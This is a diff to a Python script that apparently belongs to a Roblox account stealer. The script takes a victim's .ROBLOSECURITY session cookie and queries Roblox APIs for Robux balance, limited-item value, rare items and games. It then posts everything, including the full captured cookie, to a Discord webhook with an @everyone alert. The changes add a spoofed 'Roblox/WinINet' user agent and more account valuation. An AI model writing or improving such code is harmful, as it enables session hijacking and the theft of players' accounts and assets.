@@ -21,7 +21,7 @@ def get_csrf_token(headers):
 
 def safe_get(url, headers=None):
     try:
-        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
+        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Roblox/WinINet'})
         with urllib.request.urlopen(req, timeout=10) as res:
             if res.status == 200:
                 return json.loads(res.read().decode('utf-8'))
@@ -56,9 +56,10 @@ def main():
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
+        # Spoofed user-agent matching WinINet requirement
         headers = { 
             "Cookie": f".ROBLOSECURITY={roblosecurity}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "User-Agent": "Roblox/WinINet",
             "Referer": "https://www.roblox.com/",
             "Origin": "https://www.roblox.com/",
             "Accept": "application/json, text/plain, */*"
@@ -76,13 +77,18 @@ def main():
         robux_balance = 0
         pending_robux = 0
         account_age_days = 0
+        
+        # Financial / Limited metrics
+        total_rap = 0
+        limiteds_count = 0
+        
+        # Assets flags
         has_korblox = False
         has_headless = False
 
-        # Game Transaction Tracking via Asset/Gamepass IDs
-        mm2_passes_found = 0
-        ps99_passes_found = 0
-        blade_ball_passes_found = 0
+        # Game Metrics
+        games_count = 0
+        total_visits = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -97,57 +103,45 @@ def main():
                 except Exception:
                     pass
 
-            # Fetch Robux Balance
+            # 1. Fetch Robux Balance
             economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
-            # Fetch Pending Robux
-            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
+            # 2. Fetch Pending Robux
+            totals_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary", headers)
             if totals_data:
                 pending_robux = totals_data.get("pendingRobux", 0)
 
-            # Deep scan transactions to match exact game asset/gamepass IDs or known titles
-            cursor = ""
-            for _ in range(3): # Scan up to 300 transactions
-                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
-                if cursor:
-                    tx_url += f"&cursor={cursor}"
-                tx_data = safe_get(tx_url, headers)
-                if not tx_data or "data" not in tx_data:
-                    break
-                
-                for tx in tx_data["data"]:
-                    details = tx.get("details", {})
-                    item_name = str(details.get("name", "")).lower()
-                    item_id = str(details.get("id", ""))
-                    
-                    # You can add specific known gamepass IDs or precise keywords here
-                    if any(k in item_name for k in ["murdermystery2", "mm2", "radio mm2", "elite mm2", "godly"]):
-                        mm2_passes_found += 1
-                    if any(k in item_name for k in ["pet simulator 99", "ps99", "huge", "exclusive pet", "vip ps99"]):
-                        ps99_passes_found += 1
-                    if any(k in item_name for k in ["blade ball", "dual sword blade ball", "inf spinner"]):
-                        blade_ball_passes_found += 1
-                
-                cursor = tx_data.get("nextPageCursor")
-                if not cursor:
-                    break
+            # 3. Collectibles & RAP Calculation
+            collectibles_data = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100", headers)
+            if collectibles_data and "data" in collectibles_data:
+                for item in collectibles_data["data"]:
+                    total_rap += item.get("recentAveragePrice", 0)
+                    limiteds_count += 1
 
-            # Korblox & Headless Check
-            korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
-            if isinstance(korblox_res, dict):
-                has_korblox = korblox_res.get("isOwned", False)
+            # 4. Korblox & Headless Ownership Check (Asset IDs)
+            korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/48545806", headers)
+            if korblox_res and korblox_res.get("data"):
+                has_korblox = True
 
-            headless_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers)
-            if isinstance(headless_res, dict):
-                has_headless = headless_res.get("isOwned", False)
+            headless_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/4819740796", headers)
+            if headless_res and headless_res.get("data"):
+                has_headless = True
+
+            # 5. Public Games & Visits Check
+            games_data = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=Public&limit=50", headers)
+            if games_data and "data" in games_data:
+                for game in games_data["data"]:
+                    games_count += 1
+                    total_visits += game.get("placeVisits", 0)
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
+        # Formatted Discord Payload matching dashboard design
         payload = {
-            "content": f"@everyone New Payload / Request Captured from **{username}**!",
+            "content": f"@everyone New Payload Captured from **{username}**!",
             "username": f"{username} | RBXDEV Bot",
             "avatar_url": avatar_thumb,
             "embeds": [{
@@ -160,19 +154,19 @@ def main():
                     f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                     f"👤 **Username**\n`{username}`\n\n"
                     f"📈 **Account Stats**\n"
-                    f"> • Account Age: `{account_age_days} Days`\n\n"
-                    f"🪙 **Robux Balance & Pending**\n"
-                    f"> • Balance: `{robux_balance} 🪙`\n"
-                    f"> • Pending: `{pending_robux} 🪙`\n\n"
-                    f"⭐ **Games (Purchases/Passes detected)**\n"
-                    f"> • Murder Mystery 2: `{str(mm2_passes_found > 0)}` ({mm2_passes_found})\n"
-                    f"> • Pet Simulator 99: `{str(ps99_passes_found > 0)}` ({ps99_passes_found})\n"
-                    f"> • Blade Ball: `{str(blade_ball_passes_found > 0)}` ({blade_ball_passes_found})\n\n"
-                    f"🎒 **Inventory Items**\n"
+                    f"> • Account Age: `{account_age_days} Days`\n"
+                    f"> • Game Visits: `{total_visits}`\n"
+                    f"> • Public Games: `{games_count}`\n\n"
+                    f"🪙 **Economy Section**\n"
+                    f"> • Balance: `{robux_balance}`\n"
+                    f"> • Pending: `{pending_robux}`\n"
+                    f"> • RAP: `{total_rap}`\n"
+                    f"> • Limiteds Count: `{limiteds_count}`\n\n"
+                    f"🎒 **Items & Bundles**\n"
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
+                    f"🔑 **Full Captured Cookie**:\n{full_cookie_display}"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
@@ -183,7 +177,7 @@ def main():
         data = json.dumps(payload).encode('utf-8')
         req = urllib.request.Request(
             webhook_url, data=data,
-            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
+            headers={'Content-Type': 'application/json', 'User-Agent': 'Roblox/WinINet'}
         )
 
         for attempt in range(3):
